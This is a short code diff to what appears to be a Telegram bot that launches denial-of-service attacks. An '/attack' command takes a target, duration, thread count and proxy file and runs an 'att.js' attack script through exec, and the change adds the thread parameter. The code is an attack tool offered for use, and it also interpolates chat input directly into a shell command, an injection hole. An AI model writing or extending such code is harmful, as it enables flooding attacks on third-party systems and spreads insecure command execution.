@@ -21,6 +21,7 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
     const target = args[0];
     const time = parseInt(args[1]);
     const numWords = args[2] || 100;
+    const thread = args[3] || 2;
     const proxyFile = args[4] || 'proxy.txt';
 
     // Validate arguments
@@ -34,7 +35,7 @@ bot.onText(/\/attack (.+)/, (msg, match) => {
     }
 
     // Run command and send success message
-    const command = `node att.js ${target} ${time} ${numWords}  ${proxyFile}`;
+    const command = `node att.js ${target} ${time} ${numWords} ${thread} ${proxyFile}`;
     exec(command, (error, stdout, stderr) => {
         if (error) {
             bot.sendMessage(chatId, `ATTACK SUCCESSFULLY END`);
